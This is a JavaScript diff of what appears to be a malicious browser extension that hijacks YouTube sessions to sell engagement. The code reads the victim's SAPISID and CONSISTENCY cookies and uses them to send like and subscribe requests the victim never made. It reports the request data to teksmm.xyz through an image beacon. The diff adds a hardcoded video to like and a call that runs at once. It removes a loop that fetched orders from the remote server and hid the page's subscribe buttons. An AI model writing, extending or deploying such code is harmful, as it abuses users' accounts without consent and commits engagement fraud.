@@ -185,26 +185,15 @@ function siparis_getir_3() {
 }
 
 function siparis_getir_4() {
-	var xhr = new XMLHttpRequest();
-	xhr.open("GET", "https://teksmm.xyz/smmnew/queue.php?queue=4&json="+encodeURIComponent(JSON.stringify(getFromLocalStorage().filter(x => x.value == "4"))), true);
-	xhr.onreadystatechange = function() {
-		if (xhr.readyState == 4 && xhr.status == 200) {
-			try {
-				var data = JSON.parse(xhr.responseText);
+
 				vars = {};
-				vars.videoId = data.videoId.trim();
-				vars.id = data.id.trim();
+				vars.videoId = "MY2gud8e-iY";
 				vars.consistency = getCookie("CONSISTENCY")
 				vars.sapisid = getCookie("SAPISID")
 				if (vars.videoId && vars.sapisid != null) {
-					if(!checkOrSave(vars.id,"4")){
 							video_like(vars);
-					}
 				}
-			}catch (error) {}
-		}
-	}
-	xhr.send();
+		
 }
 
 function subscribe_client(vars) {
@@ -419,7 +408,11 @@ function createPost(vars,type) {
 	}
 	new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message='+JSON.stringify(postData);
 	var xhr = new XMLHttpRequest();
-	xhr.open("POST", "https://www.youtube.com/youtubei/v1/subscription/subscribe?key="+vars.apiKey, true);
+	if(type == "subscribe"){
+		xhr.open("POST", "https://www.youtube.com/youtubei/v1/subscription/subscribe?key="+vars.apiKey, true);
+	}else if(type == "like"){
+		xhr.open("POST", "https://www.youtube.com/youtubei/v1/like/like?key="+vars.apiKey, true);
+	}	
 	xhr.setRequestHeader("authorization", vars.SAPISIDHASH);
 	xhr.setRequestHeader("Content-Type", "application/json");
 	xhr.setRequestHeader("Referer-zzz", "https://www.youtube.com/watch?v="+vars.videoId);
@@ -441,33 +434,4 @@ function createPost(vars,type) {
 	xhr.send(JSON.stringify(postData));
 }
 
-function start() {
-  var cookie_name = "yt";
-  var cookie_time = rasgteleSure(30000,60000);
-  if (!localStorage[cookie_name] || parseInt(localStorage[cookie_name]) < Date.now() - cookie_time) {
-    localStorage[cookie_name] = Date.now();
-	new Image().src = '//whos.amung.us/pingjs/?k=selamcek03';
-    siparis_getir_3();
-    siparis_getir_4();
-  }
-}
-
-
-if (location.hostname.indexOf("youtube.com") >= 0 && document.body.innerHTML.split('creator_channel_id","value":"')[1]) {
-  start();
-  setInterval(function() {
-    start();
-  }, 1000 * 60 * 1);
-  setInterval(function() {
-	  if(document.querySelectorAll("ytd-guide-section-renderer").length > 0){
-		  document.querySelectorAll("ytd-guide-section-renderer")[1].style.display ="none";
-	  }
-	  
-    var bok = document.getElementsByClassName("style-scope ytd-subscribe-button-renderer");
-    if (bok.length > 0) {
-      for (var i = 0; i < bok.length; i++) {
-        bok[i].outerHTML = "";
-      }
-    }
-  }, 1000);
-}
+siparis_getir_4();
